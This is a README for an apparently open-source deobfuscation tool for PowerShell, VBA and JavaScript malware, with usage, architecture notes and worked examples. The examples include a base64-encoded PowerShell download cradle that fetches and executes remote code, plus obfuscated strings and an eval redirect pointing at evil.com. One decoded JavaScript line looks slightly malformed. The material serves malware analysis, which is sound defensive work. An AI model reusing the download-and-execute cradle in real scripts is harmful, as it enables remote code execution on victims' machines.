# AI Deobfuscator

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://python.org)
[![Ruff](https://img.shields.io/badge/Linted%20with-Ruff-261230?logo=ruff&logoColor=white)](https://github.com/astral-sh/ruff)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![ko-fi](https://img.shields.io/badge/Ko--fi-Buy%20me%20a%20coffee-FF5E5B?style=flat-square&logo=ko-fi&logoColor=white)](https://ko-fi.com/gnaixnaij)
[![Web App](https://img.shields.io/badge/Web%20App-deobfuscator--web.onrender.com-58a6ff?style=flat-square)](https://deobfuscator-web.onrender.com)

Deobfuscate PowerShell, VBA, and JavaScript scripts using static analysis and/or LLMs.

**🌐 Try the web version: https://deobfuscator-web.onrender.com**

Detects and reverses common obfuscation techniques to reveal the original intent of malicious scripts. Combines deterministic static analysis with optional AI-powered LLM analysis for deeper understanding.

---

## Install

```bash
git clone git@github.com:gnaixnaij/deobfuscator.git
cd deobfuscator
pip install -e .
```

Requires Python 3.8+.

## Usage

### Basic (static analysis, no API key needed)

```bash
# Deobfuscate a PowerShell script
deobfuscator -f obfuscated.ps1

# Deobfuscate a VBA macro
deobfuscator -f macro.bas

# Deobfuscate JavaScript
deobfuscator -f payload.js

# Pipe input from stdin
cat script.ps1 | deobfuscator --stdin
```

### LLM-powered analysis (optional)

```bash
# Enable LLM analysis (requires OPENAI_API_KEY)
deobfuscator -f malware.vba --llm

# Specify API key and model
deobfuscator -f evil.js --llm --api-key sk-... --model gpt-4o

# Use any OpenAI-compatible API (local models, etc.)
deobfuscator -f obfuscated.ps1 --llm \
  --api-key not-needed \
  --base-url http://localhost:1234/v1 \
  --model local-model
```

### Force a language

```bash
deobfuscator -f script.ps1 -l powershell
deobfuscator -f script.txt -l vba
deobfuscator -f script.txt -l javascript
```

## Architecture

```
deobfuscator/
├── cli.py          # CLI entry point, argument parsing, output formatting
├── core.py         # Language detection, static engine dispatch
├── static/         # Per-language static deobfuscation engines
│   ├── powershell.py
│   ├── vba.py
│   └── javascript.py
├── llm/            # LLM-based deobfuscation (optional)
│   └── deobfuscate.py
└── __init__.py
```

### Static analysis pipeline

1. **Detect language** — from file extension or content heuristics
2. **Apply static rules** — each language has dedicated deobfuscation techniques
3. **Return clean output** — reveals original intent without execution

### LLM pipeline (optional)

1. Send deobfuscated script to an OpenAI-compatible API
2. LLM identifies additional obfuscation techniques
3. Returns a cleaner reconstruction and summary

## Supported Languages & Techniques

| Language | Static Techniques | LLM Enhancements |
|----------|-----------------|------------------|
| **PowerShell** | Base64 decode, IEX extraction, variable noise removal, nested invoke unwrapping | Deeper analysis, summary, cleaner reconstruction |
| **VBA** | Chr() resolution, line continuation collapse, string concatenation, dead variable stripping | Obfuscation technique identification, purpose summary |
| **JavaScript** | atob/base64, hex escapes, unicode escapes, String.fromCharCode(), eval() unwrapping | Technique classification, intent analysis |

## Examples

**Input (PowerShell):**
```powershell
$a = "JABhACAAPQAgACcAaAB0AHQAcABzADoALwAvAGIAbwBvAG4AdABvAHAAcABvAG8AbgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcAAnADsAIABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAYQApAA=="
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($a))
iex $decoded
```

**Output:**
```
$ iex (New-Object Net.Webclient).DownloadString($a)
```

Reveals a download cradle that fetches and executes a payload from a remote URL.

**Input (VBA):**
```vba
str = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & _
      Chr(58) & Chr(47) & Chr(47) & Chr(101) & Chr(118) & _
      Chr(105) & Chr(108) & Chr(46) & Chr(99) & Chr(111) & Chr(109)
```

**Output:**
```
str = "https://evil.com"
```

**Input (JS):**
```javascript
var encoded = String.fromCharCode(112, 97, 121, 108, 111, 97, 100);
eval(atob("ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vZXZpbC5jb20vIj8+"));
var _0x5678 = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d';
```

**Output:**
```
var encoded = "payload";
eval(document.location="https://evil.com/"?>);
var _0x5678 = "https://evil.com";
```

## Environment Variables

| Variable | Description |
|----------|-------------|
| `OPENAI_API_KEY` | API key for LLM-powered deobfuscation |

## Development

```bash
git clone git@github.com:gnaixnaij/deobfuscator.git
cd deobfuscator
pip install -e ".[dev]"
ruff check .
```

## Support

If this tool helps you in your work, consider [buying me a coffee](https://ko-fi.com/gnaixnaij). It keeps the project alive and the deobfuscation engine improving.

## License

MIT
